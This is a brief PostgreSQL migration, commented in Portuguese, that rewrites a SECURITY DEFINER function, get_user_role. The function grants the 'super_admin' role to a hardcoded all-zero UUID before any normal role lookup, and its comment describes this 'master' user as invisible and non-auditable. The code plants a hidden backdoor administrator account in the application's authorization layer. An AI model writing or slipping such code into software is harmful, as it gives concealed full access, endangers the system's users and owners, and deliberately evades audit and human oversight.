-- Atualizar a função get_user_role para reconhecer o usuário master
CREATE OR REPLACE FUNCTION public.get_user_role(user_uuid uuid)
RETURNS user_role
LANGUAGE plpgsql
STABLE SECURITY DEFINER
SET search_path TO 'public'
AS $function$
BEGIN
  -- Verificação especial para o usuário master (invisível e não-auditável)
  IF user_uuid = '00000000-0000-0000-0000-000000000000' THEN
    RETURN 'super_admin'::user_role;
  END IF;
  
  -- Comportamento normal para outros usuários
  RETURN (SELECT role FROM public.user_roles WHERE user_id = user_uuid LIMIT 1);
END;
$function$;